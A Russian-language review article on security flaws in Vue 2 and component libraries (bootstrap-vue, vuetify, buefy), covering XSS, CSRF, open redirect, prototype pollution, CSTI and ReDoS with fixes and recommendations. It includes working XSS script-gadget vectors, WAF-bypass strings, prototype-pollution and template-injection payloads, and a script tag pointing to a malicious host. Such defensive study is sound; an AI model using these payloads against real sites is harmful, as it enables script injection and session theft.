# Уязвимости Vue 2 и смежных пакетов
Содержание
- [Уязвимости Vue 2 и смежных пакетов](#уязвимости-vue-2-и-смежных-пакетов)
  - [Введение](#введение)
  - [Уязвимости фронтенда: XSS и его друзья](#уязвимости-фронтенда-xss-и-его-друзья)
  - [Что же такое Vue](#что-же-такое-vue)
  - [Уязвимости Vue 2](#уязвимости-vue-2)
    - [XSS](#xss)
    - [CSRF](#csrf)
    - [Open Redirect](#open-redirect)
    - [Prototype Pollution](#prototype-pollution)
    - [CSTI](#csti)
    - [ReDoS](#redos)
  - [Уязвимости библиотек компонентов](#уязвимости-библиотек-компонентов)
  - [Рекомендации](#рекомендации)

## Введение
В этой статье я хотела бы рассмотреть уязвимости фреймворка Vue.js второй версии и некоторых совместимых с ним пакетов и библиотек, а также способы их исправления.

<!-- По моему скромному опыту, Vue показывает себя как очень лаконичный и приятный инструмент для фронтенд-разработки. Это, в свою очередь, усиливает желание сделать результат разработки как можно более качественным и безопасным. -->

В настоящий момент Vue.js постепенно [набирает популярность](https://npmtrends.com/angular-vs-react-vs-vue), немногим уступая таким известным JavaScript-фреймворкам и библиотекам, как [React](https://ru.reactjs.org/) и [Angular](https://angular.io/). Несмотря на то, что он начинался как индивидуальный проект, его уже используют многие крупные компании, включая Netflix, Facebook и GitLab.

Статья является обзорной и может быть интересна как фронтенд-разработчикам, желающим познакомиться либо уже знакомым с Vue, так и специалистам по анализу защищенности веб-приложений.

## Уязвимости фронтенда: XSS и его друзья
В [OWASP Top 10 Client-Side Security Risks](https://owasp.org/www-project-top-10-client-side-security-risks/) перечислены наиболее распространенные уязвимости на стороне клиента. Рассмотрим те из них, которые чаще встречаются во Vue и смежных пакетах:
* [XSS](#common_xss)
* [CSRF](#common_csrf)
* [Open Redirect](#common_or)
* [Prototype Pollution](#common_cpp)
* [CSTI](#common_csti)
* [ReDoS](#common_redos)

<!-- ### XSS -->
<a name="common_xss">**Cross-Site Scripting (XSS)**</a> – это крайне известная уязвимость, при которой на страницу внедряется вредоносный JavaScript-код, взаимодействующий с веб-сервером злоумышленника. Сам злоумышленник может получить доступ к cookie, токенам или другой конфиденциальной информации, сохраненной браузером и используемой на этом сайте, либо переписать сожержимое html-страницы.

В зависимости от места хранения вредоносной нагрузки существуют:
* Хранимые (Stored, Persistent, Type-I) XSS
* Отраженные (Reflected, Non-Persistent, Type-II) XSS
* На основе DOM (DOM-based, Type-0) XSS
* Mutated (mXSS), при которых что-то, что кажется безопасным, модифицируется браузером при анализе разметки
  
<!-- В случае **хранимой** XSS внедренный скрипт постоянно хранится на целевых серверах, в базах данных –  например, в отзывах на товар. Жертвами такой атаки могут стать все пользователи, посетившие зараженную страницу. Пример:
```html
<div class="comment">
   <p>I highly recommend this product, 11/10!</p>
   <script src=”http://malicious.com/exploit.js”></script>
</div>
```
Результат **отраженных** XSS сразу возвращается веб-сервером. Отраженные атаки доставляются жертвам по другим каналам, например, по почте. Когда пользователя обманом заставляют щелкнуть вредоносную ссылку, внедренный код перемещается на уязвимый веб-сайт, где браузер выполняет его. Пример ссылки:
```html
https://insecure-website.com/hello?name=<script>alert(1);</script>
<p>Hello, <script>alert(1);</script>!</p>
```
При XSS **на основе DOM** полезная нагрузка атаки выполняется в результате изменения «окружения» DOM в браузере жертвы. HTTP-ответ не меняется, но код на стороне клиента выполняется по-другому из-за вредоносных модификаций, которые произошли в среде DOM. Пример:
```JavaScript
results.innerHTML = 'You searched for: ' + search;
```
```html
http://insecure-website.com/page.html?default=<img+src%3Dx+onerror%3D%27badThings()%3B%27>
<p>You searched for: <img src=x onerror='badThings();'></p>
``` -->

Также XSS делятся на активные и пассивные. Первые, в отличие от вторых, срабатывают без каких-либо действий (переход по ссылке, нажатие на кнопку) со стороны жертвы и, как следствие, являются более опасными.

<!-- ### CSRF -->
<a name="common_csrf">**Cross-Site Request Forgery** (CSRF)</a> – достаточно популярная атака, которая заставляет пользователя выполнять нежелательные действия в веб-приложении, в котором он в настоящее время аутентифицирован. Под видом безобидной ссылки в письме или сообщении на стороннем сайте может скрываться запрос на денежный перевод, а сайт банка при этом не способен отличить эту ситуацию от перевода через форму. Если XSS эксплуатирует доверие пользователя определенному веб-приложению, то CSRF доверие веб-приложения браузеру пользователя.

Если жертва является обычным пользователем, успешная атака CSRF может заставить пользователя выполнять запросы на изменение состояния, такие как перевод средств. Если жертва является административной учетной записью, CSRF может скомпрометировать все веб-приложение.

Пример ссылки:
```html
<a href="http://bank.com/transfer.do?to=evil_hacker&amount=31337">Receive a Special Offer!</a>
```

На таких порталах как [owasp.com](https://owasp.org/www-community/attacks/xss/) и [portswigger.net](https://portswigger.net/web-security/csrf) существует множество отличных материалов по XSS и CSRF, поэтому останавливаться на них подробнее не вижу никакого смысла.

<!-- ### Open Redirect -->
<a name="common_or">**Open redirect**</a> – брешь в системе безопасности приложения или веб-страницы, из-за которой не удается должным образом аутентифицировать URL-адреса. Когда значения параметра в HTTP GET-запросе позволяет перенаправить пользователя на новый сайт без проверки целевого сайта, открывается возможность для фишинговой атаки, XSS, CSRF или загрузки вредоносных файлов.

Существует два вида Open Redirect:
* Header-Based, использующие уязвимый код непосредственно при вводе данных пользователем
* JavaScript-Based, запускающиеся только при выполнении JavaScript как части функции редиректа

Пример JavaScript-Based Open Redirect:
```html
<a v-bind:href="userProvidedUrl">
  Нажми на меня
</a>
```
В этом случае при отсутствии санитизации существует риск исполнения JavaScript через `javascript:`.

Пример Header-Based Open Redirect на php:
```php
$redirect_url = $_GET['url'];
header("Location: " . $redirect_url);
```
Вредоносная ссылка дет выглядеть так:
```
http://example.com/example.php?url=http://malicious.example.com
```
Подробнее об уязвимости и способах ее поиска [здесь](https://habr.com/ru/company/otus/blog/511428/).

<!-- ### Client Prototype Pollution -->
<a name="common_cpp">**Client Prototype Pollution**</a> является относительно новой уязвимостью (2020) и характерна только для JavaScript. В нем у каждого объекта есть внутреннее свойство `[[Prototype]]`, содержащее ссылку на объект родителя. У родителя, в свою очередь, тоже может быть прототип, у родителя родителя тоже и так далее; последовательность прототипов от объекта до `null` называется цепочкой прототипов или `prototype chain`.

Свойство `prototype` родителя отвечает за те методы и свойства, которые унаследуют все его потомки. При обращении к свойству оно ищется во всей цепочке прототипов. Обратиться к родителю через наследника можно посредством свойств `__proto__`, `Object.getPrototypeOf()` и других.

Термином prototype pollution называют изменение свойства prototype базовых объектов: `Object.prototype`, `Function.prototype`, `Array.prototype`. После исполнения
```JavaScript
Object.prototype.answer = 42;
// или, что то же самое
const obj = new Object();
obj.__proto__.answer = 42;
```
Свойство `answer` со значением 42 будет у любого объекта, если:
* в нем не определено это свойство (иначе оно перекроет свойство прототипа)
* он наследуется от `Object.prototype`

Клиентский prototype pollution чаще всего эскалируется до Reflected XSS, пейлод в большинстве случаев находится в параметрах запроса (после ?) или в фрагменте (после #). Подробнее про методы поиска и эксплуатации можно почитать в [статье на хабре](https://habr.com/ru/company/huawei/blog/547178/) и на [snyk.io](https://learn.snyk.io/lessons/prototype-pollution/javascript/).

<!-- ### CSTI -->
Server Side Template Injection (SSTI) происходит, когда злоумышленник может использовать собственный синтаксис шаблона для внедрения вредоносной полезной нагрузки в шаблон, который затем выполняется на стороне сервера. В то время как SSTI позволяет выполнить код на удаленном сервере, <a name="common_csti">**Client Side Template Injection** (CSTI)</a> позволяет выполнять произвольный код JavaScript на стороне жертвы.

Когда в приложении на Vue пользовательский ввод отражается внутри тела HTML, можно выполнить произвольный JavaScript-код, используя двойные фигурные скобки. Пример нагрузки:
```JavaScript
{{constructor.constructor('alert(1)')()}}
```
CSTI и Prototype Pollution часто называют разновидностями XSS. Подробнее о CSTI можно почитать [тут](https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti).

<!-- ### ReDoS -->
<a name="common_redos">**The Regular expression Denial of Service** (ReDoS)</a> – атака типа «отказ в обслуживании», которая использует тот факт, что реализации регулярных выражений могут достигать экстремальных ситуаций, которые заставляют их работать очень медленно (в экспоненциальной зависимости от размера входных данных).

Пример:
```JavaScript
regex = /A(B|C+)+D/
```

В большинстве случаев движку регулярных выражений не требуется много времени, чтобы найти совпадение, однако, если передать на вход невалидную строку `ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX`, для завершения теста требуется в десять раз больше времени.

Эта разница связана с тем, как оцениваются регулярные выражения.
Если движку не удается принять первый способ интерпретации текущего символа, он вернется и посмотрит, есть ли другой способ трактовать предыдущий. Если он заходит слишком далеко и при этом многие символы имеют несколько допустимых интерпретаций, количество шагов возврата стремительно возрастает. Это приводит к тому, что известно как **catastrophic backtracking**.

Познакомиться с ReDoS поближе можно либо при помощи [статьи](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS), либо на примере [подробного разбора](https://security.snyk.io/vuln/npm:vue:20180222) описанной выше ситуации.

Три последние уязвимости – Client Prototype Pollution, CSTI и ReDoS – могут использоваться для DoS-атак на клиенте (например, чтобы положить кому-нибудь вкладку браузера до слещующей перезагрузки), однако не стоит списывать их со счетов.

## Что же такое Vue
Vue (произносится как “вью”) – это прогрессивный Java-Script фреймворк с [открытым исходным кодом](https://github.com/vuejs/vue) для создания пользовательских интерфейсов и одностраничных веб-приложений.

Прогрессивность подразумевает постепенное внедрение: Vue можно использовать как для части существующего проекта, так и самостоятельно, например, при помощи `@vue/cli`. Разработка Vue.js ведется с 2013 года; первая и вторая версии были выпущены в 2015 и 2016 годах, третья – в 2020. На данный момент из-за того, что большинство библиотек компонентов все еще несовместимы с последней версией, наибольшей популярностью у разработчиков пользуется [Vue 2](https://v2.vuejs.org/).

К основным особенностям фреймворка относятся:
* Декларативный рендеринг
* Реактивность

**Декларативный рендеринг** позволяет отображать данные в DOM, используя простой синтаксис шаблонов. В отличие от императивного стиля, разработчик делегирует детали реализации фреймворку, описывая не то, *что* он должен сделать, а то, *как должен выглядеть* результат.

**Реактивность** означает, что представление в модели MVC изменяется по мере изменения модели: разработчики привязывают представление к соответствующей модели, и Vue автоматически наблюдает за изменениями, обновляя его.

От своих аналогов – Angular и React – Vue отличается простотой и лаконичностью. Ниже представлен [базовый пример](https://scrimba.com/scrim/cQ3QVcr?pl=pXKqta) приложения на Vue 2. Рассмотрим подробнее `index.js`:
```js
var app = new Vue({ 
    el: '#app',
    data: {
        message: 'Hello Vue!'
    }
});
```
В примере выше компонент `app`, соответствующий элементу с таким же `id`, создается при помощи `Vue.component`. В больших проектах или когда интерфейс полностью основан на JavaScript, компоненты удобнее оформлять в стиле [single-file components](https://v2.vuejs.org/v2/guide/single-file-components.html), где каждый из них – это файл с расширением `.vue`. Структура таких файлов состоит из трех частей:
* блок `<template>`, отвечающий за html-шаблон компонент (является обязательным и содержит только один корневой компонент)
* блок `<script>`, отвечающий за логику и содержащий состояние компонента (в примере – `data`)
* блок `<style>`, отвечающий за стили

То есть вместо того, чтобы делить все приложение на три слоя (файлы `.html`, `.js`, `.css`), оно разбивается на компоненты, внутри которых сохраняется то же разделение.

Базовый пример компонента в таком стиле выглядит [следующим образом](https://codesandbox.io/s/github/vuejs/v2.vuejs.org/tree/master/src/v2/examples/vue-20-single-file-components):
```js
<template>
  <p>{{ greeting }} World!</p>
</template>

<script>
module.exports = {
  data: function() {
    return {
      greeting: "Hello"
    };
  }
};
</script>

<style scoped>
p {
  font-size: 2em;
  text-align: center;
}
</style>
```
Для того, чтобы добавить реактивность в проект на Vue, можно воспользоваться входными параметрами, вычисляемыми свойствами компонентов, директивами, событиями, наблюдателями и т.д.

Входные параметры `props` – пользовательские атрибуты, устанавливаемые на компоненте. Когда значение передаётся в атрибут входного параметра, оно становится свойством экземпляра компонента, как `data` в примере. Вычисляемые свойства используются для переноса сложной логики из шаблона в свойство `computed`, которое, в отличие от обычного метода, пересчитывается только в случае изменения зависимостей. [Директивы](https://ru.vuejs.org/v2/api/#%D0%94%D0%B8%D1%80%D0%B5%D0%BA%D1%82%D0%B8%D0%B2%D1%8B) – это команды, обрабатываемые Vue, и записанные как атрибуты HTML-тэгов. Обычно директивы Vue начинаются с префикса `v-`. Некоторым директивам можно передавать дополнительные аргументы через двоеточие:
* `v-text` управляет текстовым содержимым элемента
* `v-html` управляет HTML-содержимым элемента, что может привести к XSS при передаче пользовательского ввода
* `v-show` переключает CSS-свойство `display` элемента, в зависимости от того, истинно ли указанное выражение
* `v-on` (сокращается как '@') устанавливает обработчик события, переданного как аргумент
* `v-bind` (сокращается как ':') отвечает за реактивную привязку атрибута к значению свойства
* `v-model` создает двухстороннюю связь элемента и свойства
* `v-if` и `v-else` отвечают за условный рендеринг элементов в зависимости от значения переданного аргумента
* `v-for` осуществляет рендеринг набора элементов, основываясь на переданных данных.

Для тех, кто уже знаком с React, пример аналогичной `v-for` конструкции может выглядеть так:

React
```js
data.map((item, i) => <div key={item.id}>item.text</div>)
```
Vue
```html
<div v-for=”(item, index) in items” :key=”item.id”>{{ item.text }}</div>
```

Vue предоставляет разработчику множество возможностей:
* роутинг при помощи библиотеки `Vue-router`
* управление состоянием при помощи `Vuex`
* отрисовка на стороне сервера (Server-Side Rendering, SSR)

Для того, чтобы увидеть все в это действии, можно посмотреть небольшой проект [TodoMVC](https://codesandbox.io/s/github/vuejs/vuejs.org/tree/master/src/v2/examples/vue-20-todomvc?from-embed), либо построенный на Firebase API, Vue 2.0 + Vue Router + Vuex [Клон HackerNews](https://github.com/vuejs/vue-hackernews-2.0), компоненты которого описаны в стиле SFC. Узнать больше о самом Vue 2, особенностях, примерах и способах его использования можно в [официальной документации](https://v2.vuejs.org/v2/guide/).

## Уязвимости Vue 2
[Официальная документация Vue 2](https://ru.vuejs.org/v2/guide/security.html) предупреждает разработчиков о том, что не следует использовать ненадёжное содержимое (например, пользовательский ввод) в качестве шаблона компонента:
```JavaScript
new Vue({
  el: '#app',
  template: `<div>` + userProvidedString + `</div>` // НИКОГДА ТАК НЕ ДЕЛАЙТЕ
})
```
Там же сообщается о том, что при исользовании двойных фигурных скобок (double mustaches) содержимое `userProvidedString` экранируется, как и в динамически привязанных атрибутах:
```JavaScript
<h1>{{ userProvidedString }}</h1>

<h1 v-bind:title="userProvidedString">
  hello
</h1>
```
Это можно считать основным правилом разработки. В случаях, когда внедрение доверенного либо санитизированного HTML, CSS и JavaScript необходимо, предлагаются следующие решения:
* внедрение HTML: шаблон с `v-html`, упомянутый в предыдущем подразделе
```html
<div v-html="userProvidedHtml"></div>
```
* либо DOM-свойство `innerHTML` в рендер-функции [с JSX]
```JavaScript
h('div', {
  domProps: {
    innerHTML: this.userProvidedHtml
  }
})
```
```html
<div domPropsInnerHTML={this.userProvidedHtml}></div>
```

* внедрение URL: `v-bind:href`
```html
<a v-bind:href="userProvidedUrl">
  Нажми на меня
</a>
```
* внедрени CSS: `v-bind:style`
```html
<a
  v-bind:href="sanitizedUrl"
  v-bind:style="userProvidedStyles"
>
  Нажми на меня
</a>
```
Все эти возможности создают определенные риски безопасности, которые будут рассмотрены далее.

<!-- Внедрение JavaScript в чистом виде ведет к XSS, и в двух случаях это не является уязвимостью фреймворка:
1. разработчик явно указывает Vue отрисовать предоставленный пользователем, несанитизированный контент в шаблонах Vue без санитизации
2. разработчик монтирует Vue на всю страницу, которая содержит как контент отрисованный на сервере, так и предоставленный пользователем. Подобное может привести к уязвимостям, когда атакующий предоставляет HTML, который безопасен как обычный HTML, но небезопасен в качестве шаблона Vue.

Лучше всего никогда не монтировать Vue на узлах, которые могут содержать контент, предоставленный как сервером так и пользователем. -->

### XSS
В одном [крайне подробном исследовании](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets) рассмотрено множество векторов Reflected XSS для Vue, например, такие:
```html
<x v-on:click='_b.constructor`alert(1)`()'>click</x>
<x v-bind:a='_b.constructor`alert(1)`()'>
<x @[_b.constructor`alert(1)`()]>
<x :[_b.constructor`alert(1)`()]>
<p v-=_c.constructor`alert(1)`()>
<x #[_c.constructor`alert(1)`()]>
<p :=_c.constructor`alert(1)`()>
<x v-bind:is="'script'" src="//14.rs" />
<!-- VueJS определяет объект $event, который ссылается на объект события в браузере.
Используя $event, можно получить доступ к объекту окна браузера и вызывать все, что угодно -->
<img src @error="e=$event.path;e[e.length-1].alert(1)">
<img src @error="e=$event.path.pop().alert(1)">
<img src @error="e=$event.composedPath().pop().alert(1)">
<img src @error=this.alert(1)>
<svg @load=this.alert(1)>
```
Некоторые атаки, рассмотренные авторами исследования, были разработаны для проектов, в которых Vue используется для рефакторинга кода на JQuery:
```JavaScript
// это не сработает
$('#message').text("'><script>alert(1)<\/script>'");
// а это исполнится
$('#message1').text("{{_c.constructor('alert(2)')()}}")
```
Выше показан интересный случай: вектор атаки появился в функции, которая давно считается безопасной, именно из-за использования нового фреймворка наравне со старой кодовой базой. Функция `text()` библиотеки JQuery санитизирует HTML, но пропускает синтаксис шаблонов без изменений.

mXSS возможна во Vue, так как  отраженная нагрузка фильтруется и тем самым мутирует DOM. Первая мутация вызвана тем, как VueJS анализирует атрибуты: если в имени атрибута есть кавычки, Vue декодирует значение атрибута, а затем удалит его недопустимое имя. Это вызывает mXSS и отображает iframe:
```html
<!-- на входе -->
<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">

<!-- на выходе -->
"="<iframe onload="alert(1)">"></iframe>
```
В виду особенностей рендеринга во Vue, тэг, который находится внутри другого тэга, не игнорируется. Совсем наоборот – удаляется внешний тэг, что открывает больше возможностей мутации:
```html
<!-- на входе -->
<xyz<img/src onerror=alert(1)>>

<!-- на выходе -->
<img src="" onerror="alert(1)">&gt;
```
Авторами также были продемонстрированы способы обхода Cloudflare:
```html
<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"> 
<x < x="&lt;iframe onload=alert(0)&gt;">
<x = x="&lt;iframe onload=alert(0)&gt;">
<x ' x="&lt;iframe onload=alert(0)&gt;">
<!-- на входе -->
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>

<!-- на выходе -->
<svg><svg></svg></svg><b><noscript></noscript><iframe onload="setTimeout(/alert(1)/.source)"></iframe></b>
```
[Демо XSS в Vue.js](https://sqreen.github.io/VueXSSDemo/#/) показывает, что XSS может появиться на странице, где используется директива `v-html`. Как уже было сказано, она позволяет парсить HTML из небезопасного пользовательского ввода, встраивая на страницу произвольный код.
```html
<div v-for="message in messages" :key="message.key">
   <div v-html="message.text">
   </div>
</div>
```
Однако этот пример скорее является ошибкой разработчика, а не уязвимостью фреймворка. [Известно](https://snyk.io/vuln/npm:vue) по меньшей мере три настоящих XSS, обнаруженные в разных его версиях.

[Первая](https://security.snyk.io/vuln/npm:vue:20170401) являлась XSS in SSR, то есть XSS, которая могла срабатывать при рендеринге страницы на сервере. Она появилась благодаря тому, что в рендер-функции не санитизировались названия атрибутов `class`, `style` и пользовательских атрибутов:
```JavaScript
export default function renderClass (node: VNodeWithData): ?string {
  const classList = genClassForVnode(node)
  if (classList) {
    return ` class="${classList}"`
  }
  return ''
}
```
Пример эксплуатации выглядит так:
```JavaScript
renderVmWithOptions({
  data: {
    xss: '"><script>alert(1)</script>'
  },
  template: `
    <div>
      <a :title="xss" :style="{ color: xss }" :class="[xss]">foo</a>
    </div>
  `
}
```
[Исправлено](https://github.com/vuejs/vue/commit/1e37633567f5d015db24ae0210b1adb4b1c3d355) это было, как не сложно догадаться, санитизацией при помощи функции `escape()`.
```JavaScript
return ` class="${escape(classList)}"`

```
Обезопасить свое приложение от этой уязвимости можно было только путем обновления Vue до версии `2.3.0-beta.1` или выше.

[Вторая XSS](https://security.snyk.io/vuln/npm:vue:20170829) была обнаружена в директиве `v-bind` все при том же SSR. Нагрузка располагалась в свойстве, которое затем передавалось в качестве ее атрибута:
```JavaScript
renderVmWithOptions({
      data: {
        test: ['"><script>alert(1)</script><!--"']
      },
      template: `<div v-bind="{ test }"></div>`
    }
```
На этот раз все [решилось](https://github.com/vuejs/vue/commit/5091e2c9847601e329ac36d17eae90bb5cb77a91) санитизацией при помощи `cachedEscape()`.

[Третья](https://security.snyk.io/vuln/npm:vue:20180802) XSS, уже более свежая, обнаружилась не только во Vue, но и в React, однако снова затронула server-rendered приложения, `v-bind` и пользовательские атрибуты. Согласно [React Security Blog](https://reactjs.org/blog/2018/08/01/react-v-16-4-2.html), такие ситуации должны встречаться на практике крайне редко, поскольку несут множество потенциальных рисков безопасности, которые трудно предусмотреть.

Вектор атаки аналогичен предыдущему:
```JavaScript
renderVmWithOptions({
      data: {
        xss: {
          'foo="bar"></div><script>alert(1)</script>': ''
        }
      },
      template: `
        <div>
          <a v-bind="xss">foo</a>
        </div>
      `
    }
```
Здесь разработчикам Vue пришлось [применить](https://github.com/vuejs/vue/commit/c28f79290d57240c607d8cec3b3413b49702e1fb) `isSSRUnsafeAttr()`. В обоих последних случаях для разработчиков веб-приложений на Vue проблема решалась простым обновлением до более свежих версий (`2.4.3` и `2.5.17` соответственно) фреймворка.

### CSRF
[CSRF во Vue.js](https://www.stackhawk.com/blog/vue-csrf-protection-guide-csrf-examples-and-how-to-enable-protection/) возможна тогда, когда при разработке не используются библиотеки для формирования и проверки CSRF-токенов, позволяющих однозначно установить, был ли запрос совершен пользователем со страницы веб-ресурса или кем-то от его имени. Это уязвимость бэкенда, однако для корректной защиты бэк и фронт должны работать сообща.

### Open Redirect
Open Redirect [был обнаружен](https://stackoverflow.com/questions/67105106/dom-based-open-redirect-vulnerability-on-vue-router) во Vue Router 3.2.0: при подстановке в URL последовательности из нескольких слешэй и произвольной URL и даты, разделенной слэшами (`http://www.localhost:3000///google.com?dob=11/10/1987`), происходил редирект на этот самый произвольный сайт, причем со всеми параметрами. 

В качестве примеров уязвимых реализаций редиректа на Vue можно перечислить следующие варианты:
* редирект без санитизации
* редирект с санитизацией, основанной на черном списке
* редирект с токенами, соответствующими целевым URL, но уязвимыми к перебору

### Prototype Pollution
Существующие векторы для Vue используют практически все директивы:
```JavaScript
?__proto__[v-if]=_c.constructor('alert(1)')()
?__proto__[attrs][0][name]=src
?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()
&__proto__[template][innerHTML]=<script>alert(1)</script>
?__proto__[props][][value]=a
?__proto__[template]=<script>alert(1)</script>
```
Другие примеры нагрузок приведены в [репозитории](https://github.com/BlackFan/client-side-prototype-pollution); все они ведут к XSS. **ajv** (Another JSON Schema Validator) до версии 6.12.3 и **hoek** <4.2.1 и =5.0.0 <5.0.3 [подвержены](https://security.snyk.io/vuln/SNYK-JS-AJV-584908) Prototype Pollution. [Proof of Concept](https://security.snyk.io/vuln/npm:hoek:20180212) для hoek:
```JavaScript
let Hoek = require('hoek');
let malicious_payload = '{"__proto__":{"oops":"It works!"}}';
let a = {}; console.log("Before: " + a.oops);
Hoek.merge({}, JSON.parse(malicious_payload));
console.log("After: " + a.oops);
```

### CSTI
Частным случаем XSS является [CSTI во Vue](https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti). Возможные нагрузки:

```JavaScript
{{toString().constructor.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}
{{_b.constructor`alert(1)`()}}
{{-function(){this.alert(1)}()}}
```

Подробнее о поиске гаджетов и минимизации векторов по [ссылке](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets), полный список нагрузок доступен [здесь](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected).

### ReDoS
[ReDoS во Vue](https://security.snyk.io/vuln/npm:vue:20180222
) был обнаружен в модуле `events.js` и обусловлен регулярными выражениями для функций и путей:
```JavaScript
const fnExpRE = /^\s*([\w$_]+|\([^)]*?\))\s*=>|^function\s*\(/
const simplePathRE = /^\s*[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*|\['.*?']|\[".*?"]|\[\d+]|\[[A-Za-z_$][\w$]*])*\s*$/
```
Символы пробелов `\s*` в начале и в конце проверяемых строк могли вызвать catastrophic backtracking, и потому [были убраны](https://github.com/vuejs/vue/commit/cd334070f3b82d3f5892c4999cc290ccd4f56fd8), как и некоторые другие части, а перед проверкой строк добавлен вызов `trim()`. Уязвимость была актуальна до версии `2.5.17`.

Наличие этой уязвимости в веб-приложении на Vue напрямую зависит от движка и качества регулярных выражений. **hawk** (библиотека для HTTP Hawk Authentication Scheme) версий <9.0.1 [подвержена](https://security.snyk.io/vuln/SNYK-JS-HAWK-2808852) ReDoS благодаря регулярному выражению для извлечения хоста и порта из запроса:
```JavaScript
internals.hostHeaderRegex = /^(?:(?:\r\n)?\s)*((?:[^:]+)|(?:\[[^\]]+\]))(?::(\d+))?(?:(?:\r\n)?\s)*$/;
```

## Уязвимости библиотек компонентов
Библиотеки компонентов для Vue, строго говоря, не берут на себя ответственность за санитизацию и безопасность данных. Зачастую они неявно используют `v-html` и `innerHTML`, что приводит к рискам безопасности.

[**bootstrap-vue**](https://github.com/bootstrap-vue/bootstrap-vue), одна из наиболее пропулярных библиотек компонентов, до версии 2.0.0-rc.12 содержит XSS, которую можно проэксплуатировать через переменную `options`. Чтобы это [исправить](https://github.com/bootstrap-vue/bootstrap-vue/pull/2479), потребовалось санитизировать значения атрибутов множества тэгов. Самое примечательное в том, что в документации не было сведений о возможности внедрять HTML в эти компоненты.

[**vuetify**](https://github.com/vuetifyjs/vuetify), фреймворк Material Design компонентов, до версии 2.1.9 также [был подвержен XSS](https://security.snyk.io/vuln/SNYK-JS-VUETIFY-474604) через массив `:error-messages`. Те проекты, в которых HTML не использовался в сообщениях, сообщениях об ошибке и подсказках, не пострадали от этой уязвимости.

[**buefy**](https://github.com/buefy/buefy), еще одна библиотека на основе Bulma, может похвастаться [целыми тремя XSS](https://snyk.io/vuln/npm:buefy):
* при помощи `src/components/autocomplete/Autocomplete.vue`, через `v-html`
* в тэге `input`, сообщения об ошибке не санитизировали ввод
* через внедрение HTML в programmatic компоненты

На примере библиотек компонентов лишний раз убеждаемся, что необходимо санитизировать пользовательский ввод всегда и везде, не надеясь на третью сторону.

## Рекомендации
Что же делать, если приложению необходимо внедрение HTML, CSS и JavaScript?

В первом случае при использовании пользовательского HTML требуется санитизация либо изоляция при помощи `iframe`. Во втором – санитизация URL, которая все еще не может полностью гарантировать отсутствие Open Redirect и внедрения JavaScript, а потому должна использоваться только при необходимости. В третьем случае пользовательские стили открывают возможность фишинговых атак, поэтому лучше изолировать их внутри `iframe` либо позволить указывать значения только отдельных свойств.

Независимо от того, обусловлена ли **XSS** использованием директивы `v-html`, существует [несколько подходов](https://ru.vuejs.org/v2/guide/security.html) по ее устранению:
* выключить парсинг HTML, подставляя сообщения на страницу так, как есть, при помощи double mustaches: ```<div>{{ message.text }}</div>```. Стоит, однако, [отметить](https://blog.sqreen.com/xss-in-vue-js/), что даже полностый отказ от использования `v-html` в проекте не гарантирует отсутствие XSS, так как эта директива может использоваться в библиотеках;
* в случае, если парсинг HTML необходим – санитизировать пользовательский ввод при помощи пакета `DOMpurify` или `sanitize-html`: ```<div v-dompurify-html="message.text"></div>```, ```<div v-html="sanitizeHtml(message.text)"></div>``` (не гарантирует защиты от CSTI);
* использовать WAF и/или настроить Content Security Policy, однако и они [не гарантируют защиты](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets) от уязвимостей, если Vue может декодировать HTML entities, а CSP содержит `unsafe-eval`.

**CSRF** исправляется добавлением csrf-токенов при отправке форм. Конкретное решение зависит от реализации серверной части, и может использовать следующие библиотеки:
* `csrf_token()` и `X-CSRF-TOKEN` в самом Vue
* `csurf` для Express.js
* `csrf-protector-php` для PHP и т.д.

Во [избежание](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) **Open Redirect** стоит:
* отказаться от перенаправления
* не давать пользователю контролировать целевой адрес
* предоставлять на выбор токены, соответствующие целевым URL
* в тех редких случаях, когда пользовательский ввод все же должен использоваться при редиректе, его надо санитизировать (например, при помощи `sanitize-url`), ограничивать белым, а не черным списком и уведомлять пользователя о переходе, запрашивая подтверждение

Для [устранения](https://habr.com/ru/company/huawei/blog/547178/) **Prototype Pollution** можно:
* добавить `__proto__` в черный список полей и не копировать его (обходится `constructor.prototype`, не защищает от изменения `Object.prototype`)
* использовать объекты без прототипов (например, Object.create(null)), разрывая prototype chain (у объекта пропадает `toString()` и т.д.)
* заморозить `Object.prototype` — использовать `Object.freeze` (могут сломаться зависимости, модифицирующие `Object.prototype`)
* требовать проверки схемы ввода JSON
* избегать использования небезопасных рекурсивных функций слияния
* использовать `Map` вместо `Object`

**CSTI** как подвид XSS уже не является таким простым случаем, и обычная HTML-санитизация не спасет от нее, так как пропускает синтаксис шаблонов. Возможные [решения](https://www.vaadata.com/blog/server-side-template-injection-vulnerability-what-it-is-how-to-prevent-it/):
* не использовать синтаксис шаблонов
* не доверять пользователям создание или редактирование шаблонов
* создать кастомную санитизацию шаблона (лучше белый список)
* использовать песочницу (можно обойти при мисконфигурации)
* выбирать Logic-less движки (Mustache)
* принять возможность исполнения произвольного кода и развернуть среду шаблонизатора в заблокированном Docker-контейнере

**ReDoS** [предотвращается](https://www.regular-expressions.info/redos.html):
* отказом от регулярных выражений
* анализом и [отладкой](https://regex101.com/) захардкоженных регулярных выражений
* установкой внешнего ограничения времени на обработку регулярных выражений
* использованием text-directed движков, у которых нет механизма возврата, а время работы зависит от длины выражения (не поддерживают некоторые функции)
* использованием движков с настройкой лимита рекурсии/времени работы

В общем случае для снижения риска появления уязвимости рекомендуется использовать комплексные меры защиты, не доверять пользовательскому вводу, а также не забывать про `npm audit fix` – команду, которая позволяет разработчику переложить всю головную боль по **отслеживанию уязвимых зависимостей** на пакетный менеджер, а исследователю – быстро и безболезненно получить отчет по уязвимостям клиентской части веб-приложения.
